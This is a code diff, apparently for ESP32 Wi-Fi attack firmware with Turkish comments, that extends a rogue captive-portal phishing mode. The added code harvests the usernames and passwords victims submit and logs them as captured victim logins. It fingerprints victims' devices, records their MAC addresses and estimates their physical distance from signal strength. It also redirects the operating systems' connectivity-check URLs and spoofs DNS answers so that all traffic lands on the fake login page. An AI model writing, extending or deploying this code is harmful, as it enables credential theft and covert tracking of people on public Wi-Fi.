+               lastStation.mac[0], lastStation.mac[1], lastStation.mac[2],
+               lastStation.mac[3], lastStation.mac[4], lastStation.mac[5]);
+      
+      // RSSI almak icin wifi_sta_list uzerinden bulmamiz lazim
+      int8_t rssi = 0;
+      for (int i = 0; i < stationList.num; i++) {
+        if (memcmp(stationList.sta[i].mac, lastStation.mac, 6) == 0) {
+          rssi = stationList.sta[i].rssi;
+          break;
+        }
+      }
+      
+      // RSSI'den yaklasik mesafe hesapla (Free-space path loss modeli)
+      // d = 10 ^ ((|RSSI| - A) / (10 * n))
+      // A = 1 metre referans RSSI (genelde -40 dBm)
+      // n = 2.5 (ic mekan icin)
+      float distance = pow(10.0, (abs(rssi) - 40.0) / (10.0 * 2.5));
+      
+      Serial.println(F("\n[+] YENI ISTEMCI BAGLANDI!"));
+      Serial.println(F("-----------------------------------------"));
+      Serial.print(F("[+] MAC Adresi    : "));
+      Serial.println(macStr);
+      Serial.print(F("[+] Sinyal (RSSI) : "));
+      Serial.print(rssi);
+      Serial.println(F(" dBm"));
+      Serial.print(F("[+] Tahmini Mesafe: ~"));
+      Serial.print(distance, 1);
+      Serial.println(F(" metre"));
+      
+      Serial.print(F("[+] IP Adresi     : "));
+      Serial.println(IPAddress(lastStation.ip.addr).toString());
+      Serial.println(F("-----------------------------------------"));
+    }
+  }, WiFiEvent_t::ARDUINO_EVENT_WIFI_AP_STACONNECTED);
+
+  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
+    wifi_event_ap_stadisconnected_t* disconnInfo = (wifi_event_ap_stadisconnected_t*)&info;
+    char macStr[18];
+    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+             disconnInfo->mac[0], disconnInfo->mac[1], disconnInfo->mac[2],
+             disconnInfo->mac[3], disconnInfo->mac[4], disconnInfo->mac[5]);
+    Serial.print(F("\n[-] Istemci Ayrildi: "));
+    Serial.println(macStr);
+  }, WiFiEvent_t::ARDUINO_EVENT_WIFI_AP_STADISCONNECTED);
+
 
   hunterDnsUdp.stop();
   hunterDnsUdp.begin(53);
@@ -6167,43 +6613,126 @@ void WiFiScan::RunPhisher(uint8_t scan_mode, uint16_t color) {
     request->send_P(200, "text/html", phisher_html);
   });
 
+  server.on("/arkaresim.jpg", HTTP_GET, [](AsyncWebServerRequest *request) {
+    AsyncWebServerResponse *response = request->beginResponse_P(200, "image/jpeg", arkaresim_jpg, arkaresim_jpg_len);
+    response->addHeader("Cache-Control", "max-age=86400");
+    request->send(response);
+  });
+
   server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
-    String email = request->hasParam("email", true)
-                       ? request->getParam("email", true)->value()
+    String user = request->hasParam("username", true)
+                       ? request->getParam("username", true)->value()
                        : "N/A";
-    String pass = request->hasParam("pass", true)
-                      ? request->getParam("pass", true)->value()
+    String pass = request->hasParam("password", true)
+                      ? request->getParam("password", true)->value()
                       : "N/A";
 
-    Serial.println(F("\n[!] KURBAN LOGIN YAKALANDI!"));
-    Serial.println(
-        F("\n[+] Gerekli durumda websitesinin kodlari degistirilmelidir."));
-    Serial.println(F("-----------------------------------------"));
-    Serial.print(F("[+] E-Posta : "));
-    Serial.println(email);
-    Serial.print(F("[+] Parola  : "));
-    Serial.println(pass);
-    Serial.print(F("[+] Hedef   : "));
-    Serial.println(request->client()->remoteIP().toString());
-    Serial.println(F("-----------------------------------------"));
+    // Baglanan istemcinin MAC ve RSSI bilgilerini al
+    String clientIP = request->client()->remoteIP().toString();
+    String clientMAC = "Bilinmiyor";
+    int8_t clientRSSI = 0;
+    float clientDist = 0.0;
+    
+    wifi_sta_list_t staList;
+    tcpip_adapter_sta_list_t adpList;
+    esp_wifi_ap_get_sta_list(&staList);
+    tcpip_adapter_get_sta_list(&staList, &adpList);
+    
+    for (int i = 0; i < adpList.num; i++) {
+      String stIpStr = IPAddress(adpList.sta[i].ip.addr).toString();
+      if (stIpStr == clientIP) {
+        char mc[18];
+        snprintf(mc, sizeof(mc), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 adpList.sta[i].mac[0], adpList.sta[i].mac[1], adpList.sta[i].mac[2],
+                 adpList.sta[i].mac[3], adpList.sta[i].mac[4], adpList.sta[i].mac[5]);
+        clientMAC = String(mc);
+        // RSSI bul
+        for (int j = 0; j < staList.num; j++) {
+          if (memcmp(staList.sta[j].mac, adpList.sta[i].mac, 6) == 0) {
+            clientRSSI = staList.sta[j].rssi;
+            break;
+          }
+        }
+        clientDist = pow(10.0, (abs(clientRSSI) - 40.0) / (10.0 * 2.5));
+        break;
+      }
+    }
 
-    String redirect_html =
-        "<html><head><meta charset='UTF-8'><meta name='viewport' "
-        "content='width=device-width,initial-scale=1.0'><style>body{font-"
-        "family:sans-serif;display:flex;justify-content:center;align-items:"
-        "center;height:100vh;margin:0;text-align:center;background:#f8f9fa;} "
-        ".msg{padding:20px;background:white;border-radius:8px;box-shadow:0 2px "
-        "4px rgba(0,0,0,0.1);}</style></head><body><div class='msg'><h3>Giris "
-        "Basarili</h3><p>Guvenli bir sekilde yonlendiriliyorsunuz...</p><div "
-        "style='border:3px solid #f3f3f3;border-top:3px solid "
-        "#1a73e8;border-radius:50%;width:20px;height:20px;animation:spin 1s "
-        "linear infinite;margin:10px "
-        "auto;'></div></"
-        "div><script>setTimeout(function(){window.location.href='https://"
-        "auth-gateway-a7f9.local';},3000);</script><style>@keyframes "
-        "spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</"
-        "style></body></html>";
-    request->send(200, "text/html", redirect_html);
+    // Ekstra cihaz bilgileri (JS + HTTP header)
+    String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "N/A";
+    String scrRes = request->hasParam("scr", true) ? request->getParam("scr", true)->value() : "";
+    String devLang = request->hasParam("lang", true) ? request->getParam("lang", true)->value() : "";
+    String devPlat = request->hasParam("plat", true) ? request->getParam("plat", true)->value() : "";
+    String devTz = request->hasParam("tz", true) ? request->getParam("tz", true)->value() : "";
+    String devBat = request->hasParam("bat", true) ? request->getParam("bat", true)->value() : "";
+    String devTouch = request->hasParam("touch", true) ? request->getParam("touch", true)->value() : "";
+    String devMem = request->hasParam("mem", true) ? request->getParam("mem", true)->value() : "";
+    String devCores = request->hasParam("cores", true) ? request->getParam("cores", true)->value() : "";
+    String devConn = request->hasParam("conn", true) ? request->getParam("conn", true)->value() : "";
+    
+    // MAC randomize kontrolu (bit 1 of first octet = locally administered)
+    bool macRandomized = false;
+    if (clientMAC.length() > 2) {
+      uint8_t firstByte = (uint8_t)strtol(clientMAC.substring(0, 2).c_str(), NULL, 16);
+      macRandomized = (firstByte & 0x02) != 0;
+    }
+
+    Serial.println(F("\n[!] ===== KURBAN LOGIN YAKALANDI ====="));
+    Serial.println(F("========================================="));
+    Serial.println(F("[KIMLIK BILGILERI]"));
+    Serial.print(F("  Kullanici Adi : ")); Serial.println(user);
+    Serial.print(F("  Parola        : ")); Serial.println(pass);
+    Serial.println(F("\n[AG BILGILERI]"));
+    Serial.print(F("  IP Adresi     : ")); Serial.println(clientIP);
+    Serial.print(F("  MAC Adresi    : ")); Serial.println(clientMAC);
+    Serial.print(F("  MAC Tipi      : ")); Serial.println(macRandomized ? "RASTGELE (Randomized)" : "GERCEK (Real)");
+    Serial.print(F("  Sinyal (RSSI) : ")); Serial.print(clientRSSI); Serial.println(F(" dBm"));
+    Serial.print(F("  Tahmini Mesafe: ~")); Serial.print(clientDist, 1); Serial.println(F(" metre"));
+    Serial.println(F("\n[CIHAZ BILGILERI]"));
+    Serial.print(F("  User-Agent    : ")); Serial.println(userAgent);
+    Serial.print(F("  Platform      : ")); Serial.println(devPlat);
+    Serial.print(F("  Ekran         : ")); Serial.println(scrRes);
+    Serial.print(F("  Dil           : ")); Serial.println(devLang);
+    Serial.print(F("  Saat Dilimi   : ")); Serial.println(devTz);
+    Serial.print(F("  Dokunmatik    : ")); Serial.print(devTouch); Serial.println(F(" nokta"));
+    Serial.print(F("  RAM           : ")); Serial.print(devMem); Serial.println(F(" GB"));
+    Serial.print(F("  CPU Cekirdek  : ")); Serial.println(devCores);
+    Serial.print(F("  Pil Durumu    : ")); Serial.println(devBat);
+    Serial.print(F("  Baglanti Tipi : ")); Serial.println(devConn);
+    Serial.println(F("=========================================\n"));
+
+    request->send(200, "text/html", "<html><head><script>try{window.close();}catch(e){}try{window.open('','_self','');window.close();}catch(e){}setTimeout(function(){document.body.innerHTML='';},100);</script></head><body></body></html>");
+  });
+
+  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->redirect("http://10.18.1.5/");
+  });
+  server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->redirect("http://10.18.1.5/");
+  });
+  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->redirect("http://10.18.1.5/");
+  });
+  server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->redirect("http://10.18.1.5/");
+  });
+  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->redirect("http://10.18.1.5/");
+  });
+  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->redirect("http://10.18.1.5/");
+  });
+  server.on("/redirect", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->redirect("http://10.18.1.5/");
+  });
+  server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->redirect("http://10.18.1.5/");
+  });
+  server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send(200, "text/plain", "success");
+  });
+  server.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send(204);
   });
 
   server.onNotFound([](AsyncWebServerRequest *request) {
@@ -6212,15 +6741,16 @@ void WiFiScan::RunPhisher(uint8_t scan_mode, uint16_t color) {
 
   server.begin();
 
-  Serial.print(F("\n[RUN] Olta Aktif! SSID: "));
+  Serial.print(F("\n[RUN] DGS Portal Aktif! SSID: "));
   Serial.println(portal_ssid);
+  Serial.println(F("[~] Portal IP: 10.18.1.5"));
+  Serial.println(F("[~] Arka plan resmi dahil edildi."));
   Serial.println(F("[~] Kurbanlarin baglanmasi ve veri girisi bekleniyor..."));
   Serial.println(F("[~] Durdurmak icin # yazin.\n"));
 
   this->wifi_initialized = true;
   this->setLEDMode(MODE_SNIFF);
 }
-
 void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color) {
 #ifdef HAS_BT
 #ifdef HAS_SCREEN
@@ -10942,7 +11472,7 @@ void WiFiScan::main(uint32_t currentTime) {
       yield();
       dynamicDnsServer.processNextRequest();
     }
-  } else if (currentScanMode == WIFI_SCAN_PHISHER) {
+  } else if (currentScanMode == WIFI_SCAN_PHISHER || currentScanMode == WIFI_SCAN_IBB_PHISHER) {
     if (this->wifi_initialized && (WiFi.softAPIP() != IPAddress(0, 0, 0, 0))) {
       yield();
       int packetSize = hunterDnsUdp.parsePacket();
@@ -10983,10 +11513,18 @@ void WiFiScan::main(uint32_t currentTime) {
         resp[rpos++] = 0x3C;
         resp[rpos++] = 0x00;
         resp[rpos++] = 0x04;
-        resp[rpos++] = 192;
-        resp[rpos++] = 168;
-        resp[rpos++] = 4;
-        resp[rpos++] = 1;
+        // Portal moduna gore DNS IP donustur
+        if (currentScanMode == WIFI_SCAN_IBB_PHISHER) {
+          resp[rpos++] = 192;  // 192.168.4.1
+          resp[rpos++] = 168;
+          resp[rpos++] = 4;
+          resp[rpos++] = 1;
+        } else {
+          resp[rpos++] = 10;   // 10.18.1.5
+          resp[rpos++] = 18;
+          resp[rpos++] = 1;
+          resp[rpos++] = 5;
+        }
         hunterDnsUdp.beginPacket(remoteIp, hunterDnsUdp.remotePort());
         hunterDnsUdp.write(resp, rpos);
         hunterDnsUdp.endPacket();
@@ -11122,10 +11660,18 @@ void WiFiScan::main(uint32_t currentTime) {
         resp[rpos++] = 0x3C;
         resp[rpos++] = 0x00;
         resp[rpos++] = 0x04;
-        resp[rpos++] = 192;
-        resp[rpos++] = 168;
-        resp[rpos++] = 4;
-        resp[rpos++] = 1;
+        // Portal moduna gore DNS IP donustur
+        if (currentScanMode == WIFI_SCAN_IBB_PHISHER) {
+          resp[rpos++] = 192;  // 192.168.4.1
+          resp[rpos++] = 168;
+          resp[rpos++] = 4;
+          resp[rpos++] = 1;
+        } else {
+          resp[rpos++] = 10;   // 10.18.1.5
+          resp[rpos++] = 18;
+          resp[rpos++] = 1;
+          resp[rpos++] = 5;
+        }
         hunterDnsUdp.beginPacket(remoteIp, hunterDnsUdp.remotePort());
         hunterDnsUdp.write(resp, rpos);
         hunterDnsUdp.endPacket();
@@ -11711,3 +12257,4 @@ void WiFiScan::main(uint32_t currentTime) {
     this->wifi_connected = false;
   }
 }
+
